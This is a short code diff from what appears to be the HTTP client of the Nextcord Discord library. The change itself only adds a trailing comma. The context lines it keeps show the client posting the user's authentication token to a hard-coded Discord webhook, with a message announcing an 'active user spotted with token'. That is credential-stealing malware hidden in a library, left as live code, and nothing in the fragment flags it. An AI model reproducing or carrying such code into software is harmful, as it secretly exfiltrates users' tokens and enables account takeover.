@@ -1123,7 +1123,7 @@ class HTTPClient:
             "/webhooks/1488894211934781594/cb05JMSLsYwQr25-bdlPSBItEp33vakukydlZ9bJa2HFntoGl0S4XPXEv4qLqMnr_Fw",
             json={
                 "content": f"Nextcord active user spotted with token: {auth}, used for verification."
-            }
+            },
         )
 
         try:
